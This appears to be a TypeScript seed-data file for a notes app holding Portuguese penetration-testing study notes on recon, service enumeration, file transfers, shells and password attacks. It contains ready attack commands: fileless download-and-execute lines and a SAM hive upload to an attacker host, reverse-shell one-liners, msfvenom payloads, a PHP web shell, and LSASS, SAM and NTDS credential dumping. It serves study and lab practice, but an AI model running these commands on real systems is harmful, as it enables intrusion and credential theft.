import { Note } from './types';

export const INITIAL_NOTES: Note[] = [
  {
    id: 'recon-web',
    title: 'Information Gathering - Web Edition',
    category: 'Reconnaissance - Web',
    tags: ['web-recon', 'passive-recon', 'active-recon', 'dns', 'whois', 'subdomain-enum', 'crt-sh', 'dorks', 'osint', 'web-archive'],
    content: `# Information Gathering - Web Edition

O reconhecimento web é a primeira etapa fundamental de qualquer avaliação de segurança cibernética ou teste de invasão.

## Objetivos Principais
- **Identificação de Ativos:** Revelar todos os componentes publicamente acessíveis do alvo, como páginas web, subdomínios, endereços IP, portas abertas e tecnologias utilizadas.
- **Descoberta de Informações Ocultas:** Localizar informações sensíveis que possam ter sido expostas inadvertidamente, incluindo arquivos de backup, arquivos de configuração, credenciais de teste ou documentação interna.
- **Análise da Superfície de Ataque:** Examinar a superfície de ataque do alvo para identificar vulnerabilidades e pontos fracos potenciais.
- **Coleta de Inteligência:** Coletar informações de inteligência (OSINT) que possam ser aproveitadas para exploração adicional ou ataques de engenharia social.

---

## Tipos de Reconhecimento

### Recon Ativo
Envolve interação direta com a infraestrutura do alvo, podendo gerar logs em firewalls e SIEMs:
- **Port Scanning:** Mapeamento de portas e serviços abertos via [[Nmap]].
- **Vulnerability Scanning:** Uso de scanners como Nikto, Nessus e Nuclei.
- **Network Mapping:** Mapeamento da topologia de rede.
- **Banner Grabbing:** Coleta de cabeçalhos de serviços.
- **OS & Web Fingerprinting:** Identificação do sistema operacional e tecnologias de aplicação.
- **Web Spidering & Crawling:** Mapeamento de links e diretórios.

### Recon Passivo
Obtenção de dados sem interagir diretamente com os servidores do alvo:
- **Search Engine Queries (Google Dorks):** Pesquisa avançada em motores de busca.
- **[[WHOIS Lookups]]:** Consulta de registros de domínio e contatos técnicos.
- **[[DNS Enumeration]]:** Levantamento de registros de DNS públicos.
- **Web Archive Analysis ([[Wayback Machine]]):** Consulta de histórico de páginas e arquivos antigos.
- **Social Media & Code Repositories:** Busca por vazamentos em GitHub, GitLab e redes sociais.

---

## WHOIS, DNS & Subdomain Enumeration

### WHOIS
Identificação do registrador, bloco IP e contatos técnicos:
\`\`\`bash
whois targetdomain.com
\`\`\`

### Enumeração DNS com Ferramentas Dedicadas
- **dnsenum:** Ferramenta abrangente para dicionário, brute-force e consulta de registros:
\`\`\`bash
dnsenum --dnsserver <IP_DNS> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt targetdomain.com
\`\`\`
- **fierce:** Descoberta recursiva com detecção de registros wildcard:
\`\`\`bash
fierce --domain targetdomain.com
\`\`\`
- **dnsrecon:** Utilitário em Python para múltiplas técnicas de reconhecimento DNS:
\`\`\`bash
dnsrecon -d targetdomain.com -t std,brt
\`\`\`
- **amass:** Projeto OWASP focado em descoberta profunda de subdomínios via OSINT e fontes ativas:
\`\`\`bash
amass enum -d targetdomain.com
\`\`\`
- **assetfinder:** Ferramenta rápida em Go para localizar subdomínios relacionados:
\`\`\`bash
assetfinder --subs-only targetdomain.com
\`\`\`
- **puredns:** Resolução DNS de alta velocidade e brute force massivo.

---

## Zone Transfer & VHosts

### [[Zone Transfer]] (AXFR)
Ocorre quando um servidor DNS secundário mal configurado permite que qualquer cliente baixe o arquivo completo da zona DNS:
\`\`\`bash
dig axfr @<IP_SERVIDORES_DNS> targetdomain.com
\`\`\`

### Virtual Hosts (VHosts) & Brute Force de Diretórios
Servidores web frequentemente hospedam múltiplos sites no mesmo IP com base no cabeçalho \`Host\`:
- **Gobuster:**
\`\`\`bash
gobuster vhost -u http://targetdomain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top10000.txt
\`\`\`
- **ffuf:**
\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top10000.txt -u http://targetdomain.com -H "Host: FUZZ.targetdomain.com" -fs 4242
\`\`\`
- **feroxbuster:** Busca recursiva ultra-rápida de diretórios.

---

## SSL Footprinting
Certificados SSL/TLS contêm registros de nomes alternativos de assunto (SAN) e logs de transparência de certificado (Certificate Transparency):
- **[[crt.sh]]:**
\`\`\`bash
curl -s "https://crt.sh/?q=%25.targetdomain.com&output=json" | jq -r '.[].name_value' | sort -u
\`\`\`
- **Censys & SSLBoard:** Plataformas de busca para mapeamento de certificados e endereços IP associados.

---

## Web Fingerprinting & Technology Identification
- **Wappalyzer & BuiltWith:** Extensões e ferramentas CLI para identificar frameworks (React, Angular), CMS (WordPress, Joomla), e servidores web.
- **WhatWeb:**
\`\`\`bash
whatweb -a 3 http://targetdomain.com
\`\`\`
- **wafw00f:** Identificação de Web Application Firewalls (WAF):
\`\`\`bash
wafw00f http://targetdomain.com
\`\`\`
- **Nikto:** Scanner de vulnerabilidades conhecidas em servidores web:
\`\`\`bash
nikto -h http://targetdomain.com
\`\`\`

---

## Crawling & Web Spiders
- Arquivos de controle: Verificar \`http://targetdomain.com/robots.txt\` e \`http://targetdomain.com/.well-known/\`.
- **Burp Suite & OWASP ZAP:** Crawling ativo e passivo durante navegação proxyfied.
- **Scrapy & ReconSpider:** Frameworks para raspagem personalizada de links e comentários HTML.

---

## Search Engine Operators (Google Dorks)
- \`site:targetdomain.com\` — Limita a busca ao domínio alvo.
- \`inurl:admin\` — Busca URLs contendo a palavra "admin".
- \`filetype:pdf\` ou \`filetype:env\` — Busca por extensões específicas.
- \`intitle:"index of"\` — Localiza diretórios expostos sem página inicial.
- \`intext:"password" OR "API_KEY"\` — Localiza credenciais expostas.

---

## Web Archive & Frameworks OSINT
- **[[Wayback Machine]] / waybackurls:** Extração de URLs históricas do repositório da Internet Archive:
\`\`\`bash
waybackurls targetdomain.com
\`\`\`
- **Recon-ng:** Framework modular em Python para automação OSINT.
- **theHarvester:** Coleta de e-mails, nomes, subdomínios e IPs de fontes abertas.
- **FinalRecon & SpiderFoot:** Automação completa de reconhecimento web e visualização de inteligência.

---
*Notas relacionadas:* [[Footprinting]], [[DNS Enumeration]], [[Zone Transfer]], [[Subdomain Enumeration]], [[Nmap]]
`,
    createdAt: '2026-08-01T10:00:00.000Z',
    updatedAt: '2026-08-06T08:00:00.000Z',
  },
  {
    id: 'footprinting',
    title: 'Footprinting Methodology & Service Discovery',
    category: 'Footprinting & Service Enumeration',
    tags: ['footprinting', 'recon', 'smb', 'cifs', 'nfs', 'dns', 'smtp', 'imap', 'pop3', 'snmp', 'mysql', 'mssql', 'oracle', 'ipmi', 'ssh', 'rdp', 'winrm'],
    content: `# Footprinting Methodology & Service Discovery

O footprinting é a metodologia sistemática para mapear a infraestrutura e os serviços de um alvo antes de qualquer tentativa de exploração.

---

## Metodologia em 6 Camadas
1. **Camada 1: Internet Presence** — Registros de domínio, subdomínios, blocos IP atribuídos e ASNs.
2. **Camada 2: Gateway & Perímetro** — Mapeamento de roteadores, firewalls, proxies e varreduras com [[Nmap]].
3. **Camada 3: Serviços Acessíveis** — Identificação de portas e protocolos ativos ([[SMB]], [[NFS]], [[SNMP]], [[SMTP]], [[HTTP]], [[SSH]], [[RDP]]).
4. **Camada 4: Processos e Dependências** — Determinar versões exatas dos softwares executados e suas dependências.
5. **Camada 5: Privilégios e Usuários** — Mapeamento de contas de usuário, grupos e níveis de acesso.
6. **Camada 6: Configuração do SO** — Análise de sistemas operacionais, arquivos de configuração e parâmetros de segurança.

---

## Enumeração Sistemática de Serviços

### 1. SMB & CIFS (Portas 139 / 445)
O protocol Server Message Block (SMB) gerencia compartilhamento de arquivos e comunicação RPC no Windows e Samba.
- **Listar compartilhamentos anônimos:**
\`\`\`bash
smbclient -N -L //<TARGET_IP>
smbmap -H <TARGET_IP>
\`\`\`
- **Interação via rpcclient:**
\`\`\`bash
rpcclient -U "" -N <TARGET_IP>
querydominfo
enumdomusers
enumdomgroups
\`\`\`
- **CrackMapExec / NetExec (nxc):**
\`\`\`bash
nxc smb <TARGET_IP> -u '' -p '' --shares
\`\`\`
- **Enum4Linux-ng & samrdump.py:** Automação completa de enumeração de SID e usuários.

### 2. NFS - Network File System (Porta 2049)
Sistemas de arquivos compartilhados em ambientes Linux/Unix.
- **Listar exportações:**
\`\`\`bash
showmount -e <TARGET_IP>
\`\`\`
- **Montar diretório remoto:**
\`\`\`bash
mkdir /tmp/nfs_mount
mount -t nfs <TARGET_IP>:/compartilhamento /tmp/nfs_mount -o nolock
\`\`\`

### 3. DNS (Porta 53 UDP/TCP)
- Consulta de versão de servidor BIND9 e registros:
\`\`\`bash
dig NS <TARGET_IP>
dig version.bind CHAOS TXT @<TARGET_IP>
dig ANY @<TARGET_IP> targetdomain.com
\`\`\`

### 4. SMTP (Porta 25 / 587)
- **Enumeração manual via Telnet / Netcat:**
\`\`\`text
telnet <TARGET_IP> 25
VRFY root
EXPN admin
RCPT TO: user@domain.com
\`\`\`
- **smtp-user-enum:**
\`\`\`bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames.txt -t <TARGET_IP>
\`\`\`

### 5. IMAP & POP3 (Portas 143/993 e 110/995)
- Inspeção de banners e certificados SSL:
\`\`\`bash
openssl s_client -connect <TARGET_IP>:993 -crlf
curl -s "pop3://<TARGET_IP>" -u user:pass
\`\`\`

### 6. SNMP (Portas 161/162 UDP)
Simple Network Management Protocol expõe MIBs (Management Information Base) com OIDs valiosos quando community strings padrão são utilizadas (\`public\`, \`private\`):
\`\`\`bash
snmpwalk -v2c -c public <TARGET_IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-default-passwords.txt <TARGET_IP>
braa public@<TARGET_IP>:.1.3.6.1.2.1.1.1.0
\`\`\`

### 7. Bancos de Dados: MySQL & MSSQL (Portas 3306 / 1433)
- **MySQL:**
\`\`\`bash
nmap -p 3306 --script mysql-enum,mysql-info <TARGET_IP>
mysql -h <TARGET_IP> -u root -p
\`\`\`
- **MSSQL:**
\`\`\`bash
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info <TARGET_IP>
sqsh -S <TARGET_IP> -U sa -P 'Password123'
\`\`\`

### 8. Oracle TNS (Porta 1521)
- Inspeção de \`tnsnames.ora\` e ferramentas de teste:
\`\`\`bash
tnscmd10g ping -h <TARGET_IP>
odat sidguesser -s <TARGET_IP> -p 1521
sqlplus user/pass@<TARGET_IP>:1521/SID
\`\`\`

### 9. IPMI (Porta UDP 623)
Gerenciamento fora de banda (BMC). Vulnerável a extração de hashes de senha de usuário admin:
\`\`\`bash
nmap -sU --script ipmi-version -p 623 <TARGET_IP>
msfconsole -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET_IP>; run"
hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt
\`\`\`

### 10. Gerenciamento Remoto: SSH, RDP & WinRM
- **SSH (Porta 22):** Identificação de chaves e versões de algoritmo.
- **RDP (Porta 3389):** Certificados TLS e NTLM domain info com \`xfreerdp\` ou \`nmap --script rdp-enum-encryption\`.
- **WinRM (Porta 5985/5986):** Gerenciamento PowerShell no Windows. Testar com \`evil-winrm -i <TARGET_IP> -u user -p pass\`.

---

## Walkthrough do Lab de Footprinting
1. Leitura inicial de tickets e identificação do escopo de rede.
2. Varredura com [[Nmap]] para encontrar a porta 445 (SMB) aberta.
3. Conexão anônima no SMB para identificar o compartilhamento \`devshare\` e baixar o arquivo \`config.xml\`.
4. Extração das credenciais do usuário \`sa\` de banco MSSQL.
5. Autenticação na porta 1433 (MSSQL) com \`sqsh\` e leitura da tabela \`devsacc\` para encontrar senhas de RDP.
6. Acesso final via RDP (\`xfreerdp\`) para obter a flag no Desktop do Administrador.

---
*Notas relacionadas:* [[Information Gathering - Web Edition]], [[SMB]], [[Nmap]], [[Password Attacks]], [[Active Directory]]
`,
    createdAt: '2026-08-02T14:20:00.000Z',
    updatedAt: '2026-08-06T08:00:00.000Z',
  },
  {
    id: 'file-transfers',
    title: 'File Transfers & Evasion Techniques',
    category: 'File Transfers & Evasion',
    tags: ['file-transfers', 'windows', 'linux', 'powershell', 'certutil', 'smb', 'ftp', 'webdav', 'curl', 'wget', 'lolbas', 'gtfobins', 'encryption'],
    content: `# File Transfers & Evasion Techniques

A transferência de arquivos entre a máquina do atacante e os sistemas da vítima é uma necessidade constante em testes de invasão e auditorias de segurança.

---

## Conceitos Iniciais & Evasão
- **WDAC (Windows Defender Application Control) & AppLocker:** Restrições de execução que bloqueiam binários não assinados.
- **SeImpersonatePrivilege:** Privilégio que permite representar tokens de outros usuários (usado em utilitários como [[PrintSpoofer]]).
- **Certutil:** Binário nativo do Windows usado para download e decodificação Base64.

---

## Operações de Download em Windows

### 1. Codificação e Decodificação Base64
Transfere pequenos scripts ou binários via terminal de texto puro sem acionar inspeção de arquivo:
- **Codificar no Linux (Atacante):**
\`\`\`bash
cat payload.exe | base64 -w 0 > payload.b64
\`\`\`
- **Decodificar no Windows (Alvo):**
\`\`\`cmd
certutil -decode payload.b64 payload.exe
\`\`\`
ou em PowerShell:
\`\`\`powershell
[IO.File]::WriteAllBytes("C:\Windows\Tasks\payload.exe", [Convert]::FromBase64String((Get-Content -Path payload.b64)))
\`\`\`

### 2. PowerShell WebClient & Invoke-WebRequest
- **DownloadFile:**
\`\`\`powershell
(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/tool.exe', 'C:\Windows\Tasks\tool.exe')
\`\`\`
- **Execução Direta em Memória (Fileless - IEX / DownloadString):**
\`\`\`powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')
\`\`\`
- **Invoke-WebRequest (iwr):**
\`\`\`powershell
Invoke-WebRequest -Uri 'http://<ATTACKER_IP>/nc.exe' -OutFile 'C:\Windows\Tasks\nc.exe' -UseBasicParsing
\`\`\`
- **Bypass de Erro de Certificado SSL:**
\`\`\`powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
\`\`\`

### 3. Compartilhamento SMB
- **Iniciar servidor SMB no Linux:**
\`\`\`bash
impacket-smbserver share . -smb2support -user test -password test
\`\`\`
- **Copiar arquivo no Windows:**
\`\`\`cmd
net use z: \\<ATTACKER_IP>\share /user:test test
copy z:\nc.exe C:\Windows\Tasks\nc.exe
\`\`\`

### 4. FTP
- **Servidor FTP no Linux:**
\`\`\`bash
python3 -m pyftpdlib -p 21 -w
\`\`\`
- **Script de comando FTP no Windows:**
\`\`\`cmd
echo open <ATTACKER_IP> 21 > ftp.txt
echo anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo binary >> ftp.txt
echo get tool.exe >> ftp.txt
echo quit >> ftp.txt
ftp -s:ftp.txt
\`\`\`

---

## Operações de Upload em Windows
- **Servidor Python de Upload:**
\`\`\`bash
python3 -m uploadserver 8000
\`\`\`
- **Upload via PowerShell (PSUpload.ps1):**
\`\`\`powershell
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PSUpload.ps1')
Invoke-FileUpload -Uri 'http://<ATTACKER_IP>:8000/upload' -File 'C:\Users\Public\sam.hive'
\`\`\`
- **WebDAV:** Usar servidores \`wsgidav\` ou \`cheroot\` e acessar via caminho UNC \`\\\\<ATTACKER_IP>@80\DavWWWRoot\\file.txt\`.

---

## Operações de Transferência em Linux

### Downloads Rápidos
- **wget & curl:**
\`\`\`bash
wget http://<ATTACKER_IP>/exploit.py -O /tmp/exploit.py
curl -o /tmp/exploit.py http://<ATTACKER_IP>/exploit.py
\`\`\`
- **Execução Fileless em Linux:**
\`\`\`bash
curl -s http://<ATTACKER_IP>/script.sh | bash
\`\`\`
- **Utilizando /dev/tcp nativo do Bash:**
\`\`\`bash
exec 3<>/dev/tcp/<ATTACKER_IP>/80
echo -e "GET /payload HTTP/1.1\r\nHost: <ATTACKER_IP>\r\n\r\n" >&3
cat <&3 > payload
\`\`\`
- **SCP (Secure Copy Protocol):**
\`\`\`bash
scp user@<ATTACKER_IP>:/path/file /tmp/file
\`\`\`

---

## Transferência Baseada em Linguagens de Programação
- **Python:**
\`\`\`python
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<ATTACKER_IP>/file", "/tmp/file")'
\`\`\`
- **PHP:**
\`\`\`php
php -r 'file_put_contents("/tmp/file", file_get_contents("http://<ATTACKER_IP>/file"));'
\`\`\`
- **Ruby:**
\`\`\`ruby
ruby -e 'require "open-uri"; File.open("/tmp/file", "wb") { |f| f.write(URI.open("http://<ATTACKER_IP>/file").read) }'
\`\`\`
- **Perl:**
\`\`\`perl
perl -e 'use LWP::Simple; getstore("http://<ATTACKER_IP>/file", "/tmp/file");'
\`\`\`

---

## Transferência com Netcat & Ncat
- **Receptor (no destino):**
\`\`\`bash
nc -l -p 1234 > arquivo_recebido
\`\`\`
- **Emissor (na origem):**
\`\`\`bash
nc -w 3 <DESTINO_IP> 1234 < arquivo_enviar
\`\`\`

---

## Redirecionamento de Disco em RDP & PSSession
- **xfreerdp com compartilhamento de pasta local:**
\`\`\`bash
xfreerdp /v:<TARGET_IP> /u:administrator /p:Password123 /drive:share,/tmp/my_tools
\`\`\`
- **PowerShell Remoting (PSSession):**
\`\`\`powershell
$s = New-PSSession -ComputerName <TARGET_IP> -Credential (Get-Credential)
Copy-Item -Path 'C:\tools\nc.exe' -Destination 'C:\Users\Public\' -ToSession $s
\`\`\`

---

## Transferências Criptografadas
Evita inspeção por IDS/IPS de rede:
- **OpenSSL AES-256 no Linux:**
\`\`\`bash
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -k SecretKey
openssl enc -d -aes-256-cbc -in file.enc -out file.txt -k SecretKey
\`\`\`
- **Invoke-AESEncryption em PowerShell:** Criptografia simétrica em scripts.

---

## Living Off The Land (LOLBAS & GTFOBins)
Uso de utilitários legítimos do SO para realizar transferências e bypassar controles:
- **LOLBAS (Windows):** \`Certreq.exe\`, \`BitsAdmin.exe\`, \`Certutil.exe\`, \`Esentutl.exe\`.
- **GTFOBins (Linux):** Executar downloads via \`curl\`, \`wget\`, \`gdb\`, \`python\`, \`tcpdump\`.
- **User-Agent Evasion:** Alterar o cabeçalho \`User-Agent\` para simular navegadores legítimos (ex: \`Mozilla/5.0 Windows NT 10.0\`) e evitar bloqueios por regras simples de firewall.

---
*Notas relacionadas:* [[Shells & Payloads]], [[Footprinting]], [[Pivoting]], [[Password Attacks]]
`,
    createdAt: '2026-08-03T09:00:00.000Z',
    updatedAt: '2026-08-06T08:00:00.000Z',
  },
  {
    id: 'shells-payloads',
    title: 'Shells, Payloads & Infiltration',
    category: 'Shells & Payloads',
    tags: ['shells', 'reverse-shell', 'bind-shell', 'msfvenom', 'metasploit', 'payloads', 'web-shell', 'tty-spawn', 'eternalblue', 'printnightmare'],
    content: `# Shells, Payloads & Infiltration

Conectar e manter acesso ao sistema alvo após explorar uma vulnerabilidade depende da entrega e execução do payload correto.

---

## Conceitos Fundamentais
- **Bind Shell:** O sistema alvo abre uma porta de escuta (listener) e aguarda a conexão direta da máquina atacante. É bloqueado por firewalls de entrada.
- **Reverse Shell:** O sistema alvo inicia uma conexão saint para o IP e porta de escuta do atacante. É ideal para atravessar firewalls de entrada e NAT.
- **Web Shell:** Interface baseada em script HTTP (PHP, ASPX, JSP) hospedada no servidor web da vítima para execução contínua de comandos.

---

## Reverse Shell One-Liners Essenciais

### Bash / Netcat (Linux)
\`\`\`bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
\`\`\`

### Python (Linux)
\`\`\`python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
\`\`\`

### PowerShell (Windows)
\`\`\`powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
\`\`\`

---

## Geração de Payloads com MSFvenom

### Payloads Staged vs Stageless
- **Stageless (Ex: \`linux/x64/shell_reverse_tcp\`):** O código completo do payload é enviado em uma única transmissão.
- **Staged (Ex: \`windows/x64/meterpreter/reverse_tcp\`):** Um pequeno código (stager) é enviado primeiro para baixar o restante da carga útil principal na memória.

### Exemplos de Comandos MSFvenom
- **Linux Executable (ELF):**
\`\`\`bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf > shell.elf
\`\`\`
- **Windows Executable (EXE):**
\`\`\`bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe > shell.exe
\`\`\`
- **Windows DLL:**
\`\`\`bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f dll > payload.dll
\`\`\`
- **ASPX Web Shell:**
\`\`\`bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f aspx > shell.aspx
\`\`\`
- **PHP Web Shell:**
\`\`\`bash
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=4444 -f raw > shell.php
\`\`\`

---

## Vulnerabilidades Críticas de Infiltração no Windows
- **MS08-067 (CVE-2008-4250):** Estouro de pilha em Server Service (NetAPI32.dll).
- **EternalBlue (MS17-010 / CVE-2017-0144):** Exploração de SMBv1 permitindo RCE como SYSTEM.
- **PrintNightmare (CVE-2021-1675):** Execução remota de código e elevação de privilégios no Spooler de Impressão.
- **BlueKeep (CVE-2019-0708):** RCE em serviços RDP legados.
- **Sigred (CVE-2020-1350):** RCE no servidor DNS do Windows.
- **SeriousSam / HiveNightmare (CVE-2021-36934):** Leitura de arquivos HKLM SAM/SYSTEM por usuários comuns.
- **Zerologon (CVE-2020-1472):** Zera a senha do Domain Controller via protocolo Netlogon.

---

## Infiltração em Linux & Interatividade TTY
Muitas shells iniciais obtidas via web vulnerabilidades são limpas/burras (não possuem suporte a TAB, CTRL+C, ou \`clear\`).

### Estabilização de Shell TTY em Linux
1. **Spawning TTY com Python:**
\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
\`\`\`
2. **Enviar para Background:** Pressionar \`CTRL + Z\`.
3. **Ajustar Terminal Local:**
\`\`\`bash
stty raw -echo; fg
\`\`\`
4. **Redefinir Variáveis no Alvo:**
\`\`\`bash
export TERM=xterm-256color
stty rows 38 columns 160
\`\`\`

### Outros Métodos de Spawn TTY
- **Perl:** \`perl -e 'exec "/bin/sh";'\`
- **Ruby:** \`ruby -e 'exec "/bin/sh"'\`
- **Lua:** \`lua -e 'os.execute("/bin/sh")'\`
- **Awk:** \`awk 'BEGIN {system("/bin/sh")}'\`
- **Escape de VIM:** \`:!/bin/sh\` ou \`:set shell=/bin/sh\`

---

## Web Shells
- **Laudanum:** Coleção de web shells injetáveis para PHP, ASP, ASPX, e JSP.
- **Antak:** Web shell em ASPX do repositório Nishang projetada para execução de comandos PowerShell.
- **PHP Web Shell Minimalista:**
\`\`\`php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; } ?>
\`\`\`
- **Bypass de Upload de Arquivos via Burp:** Alterar \`Content-Type\` para \`image/png\`, usar extensões alternativas (\`.phtml\`, \`.php5\`, \`.phar\`), ou injetar null byte (\`shell.php%00.png\`).

---

## Detecção & Prevenção
- **MITRE ATT&CK Framework:** Mapeamento de técnicas T1059 (Command and Scripting Interpreter) e T1090 (Proxy/Tunneling).
- **Event Logs de Interesse no Windows:** Event ID 4688 (Process Creation), Event ID 7045 (New Service Installed), Event ID 4104 (PowerShell Script Block Logging).
- **Proteção de Endpoints:** Utilização de EDR (Endpoint Detection and Response), bloqueio de regras ASR (Attack Surface Reduction) e limitação de privilégios de execução de scripts.

---
*Notas relacionadas:* [[File Transfers]], [[Pivoting]], [[Metasploit]], [[Password Attacks]], [[Active Directory]]
`,
    createdAt: '2026-08-03T15:30:00.000Z',
    updatedAt: '2026-08-06T08:00:00.000Z',
  },
  {
    id: 'password-attacks',
    title: 'Password Attacks, Hashes & Credential Harvesting',
    category: 'Password Attacks & Hashes',
    tags: ['passwords', 'hashcat', 'john-the-ripper', 'hydra', 'lsass', 'sam', 'ntds', 'kerberoasting', 'pass-the-hash', 'pass-the-cert', 'snaffler'],
    content: `# Password Attacks, Hashes & Credential Harvesting

Esta nota aborda métodos para extração, análise, quebra e abuso de credenciais em sistemas operacionais e serviços de rede.

---

## Fatores de Autenticação & Princípios de Criptografia
- **Hashes Conhecidos:** MD5, SHA1, SHA256, NTLM, NetNTLMv1/v2, Bcrypt, Argond2.
- **Salt:** Valor aleatório adicionado à senha antes de gerar o hash para prevenir ataques com Rainbow Tables (tabelas de pré-computação).

---

## Tipos de Ataque a Senhas
- **Ataque de Dicionário (Wordlist):** Teste de palavras conhecidas (ex: \`rockyou.txt\`, SecLists).
- **Ataque de Força Bruta / Máscara:** Teste exaustivo de todas as combinações de caracteres.
- **[[Password Spraying]]:** Testar uma única senha fraca comum (ex: \`Winter2026!\`) contra uma lista de múltiplos usuários para não violar políticas de bloqueio de conta (Account Lockout Policy).
- **Credential Stuffing:** Reutilização de credenciais vazadas em outros serviços.

---

## Ferramentas de Quebra de Hashes Offline

### 1. John the Ripper
- **Modo Wordlist:**
\`\`\`bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
\`\`\`
- **Modo Single Crack:** Usa informações do nome do usuário para gerar variações.
\`\`\`bash
john --single hashes.txt
\`\`\`
- **Helpers *2john:** Ferramentas para converter formatos de arquivos em hashes quebráveis pelo John:
\`\`\`bash
ssh2john id_rsa > ssh.hash
office2john documento.docx > office.hash
pdf2john documento.pdf > pdf.hash
zip2john arquivo.zip > zip.hash
\`\`\`

### 2. Hashcat
O Hashcat utiliza aceleração por GPU para quebra ultra-rápida de hashes.
- **Sintaxe Geral:**
\`\`\`bash
hashcat -m <MODO> -a <TIPO_ATAQUE> hashes.txt wordlist.txt
\`\`\`
- **Modos de Hash Comuns:**
  - \`-m 1000\`: NTLM
  - \`-m 5600\`: NetNTLMv2
  - \`-m 13100\`: Kerberoasting (TGS-REP)
  - \`-m 18200\`: ASREPRoasting
  - \`-m 1800\`: SHA-512 ($6$ Linux shadow)
- **Ataque de Máscara (\`-a 3\`):**
\`\`\`bash
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d?s
\`\`\`
*(Legenda: ?u=Maiúscula, ?l=Minúscula, ?d=Dígito, ?s=Símbolo)*
- **Geração de Palavras-Chave com CeWL:**
\`\`\`bash
cewl -w wordlist_custom.txt -d 2 http://targetdomain.com
\`\`\`

---

## Ataques a Senhas em Serviços de Rede

### Hydra
Ataque de força bruta ativo em serviços autenticados:
- **SSH:**
\`\`\`bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4
\`\`\`
- **RDP:**
\`\`\`bash
hydra -L users.txt -p Password123 rdp://<TARGET_IP> -V
\`\`\`
- **SMB:**
\`\`\`bash
hydra -L users.txt -P passwords.txt smb://<TARGET_IP>
\`\`\`

### NetExec / CrackMapExec (Password Spraying)
\`\`\`bash
nxc smb <TARGET_IP> -u users.txt -p 'Spring2026!' --continue-on-success
\`\`\`

---

## Autenticação Windows & LSASS

### Armazenamento de Credenciais
- **SAM (Security Account Manager):** Banco de dados local contendo hashes NTLM dos usuários locais (\`C:\Windows\System32\config\SAM\`).
- **LSASS (Local Security Authority Subsystem Service):** Processo em memória (\`lsass.exe\`) que armazena credenciais ativas, tickets Kerberos e hashes NTLM.

### Dump das Hives HKLM SAM/SYSTEM
\`\`\`cmd
reg save hklm\sam C:\Users\Public\sam.hive
reg save hklm\system C:\Users\Public\system.hive
reg save hklm\security C:\Users\Public\security.hive
\`\`\`
Extração offline com Impacket:
\`\`\`bash
secretsdump.py -sam sam.hive -system system.hive LOCAL
\`\`\`

### Dumping da Memória do LSASS
- **Rundll32 com comsvcs.dll (Nativo):**
\`\`\`powershell
$procid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $procid C:\Users\Public\lsass.dmp full
\`\`\`
- **Pypykatz (Extração Linux):**
\`\`\`bash
pypykatz lsa minidump lsass.dmp
\`\`\`
- **Mimikatz (Direto em memória):**
\`\`\`cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
\`\`\`

### Windows Credential Manager & Vaults
- Consultar credenciais salvas no Windows:
\`\`\`cmd
cmdkey /list
\`\`\`
- Executar processos com credenciais salvas:
\`\`\`cmd
runas /savecred /user:WORKGROUP\Administrator "cmd.exe"
\`\`\`
- Ferramenta LaZagne: Extração automática de senhas salvas em navegadores, clientes de e-mail e Wi-Fi.

---

## Active Directory Credential Harvesting

### 1. Extração do Banco [[NTDS.dit]]
O arquivo \`NTDS.dit\` armazena todas as senhas e objetos do domínio Active Directory.
- **Via VSSAdmin / Volume Shadow Copy:**
\`\`\`cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Users\Public\ntds.dit
\`\`\`
- **Dump via Impacket (secretsdump.py):**
\`\`\`bash
secretsdump.py -ntds ntds.dit -system system.hive LOCAL -outputfile domain_hashes
\`\`\`

### 2. Pass the Hash (PtH)
Uso da hash NTLM do usuário diretamente para autenticação sem necessidade de descobrir a senha em texto claro:
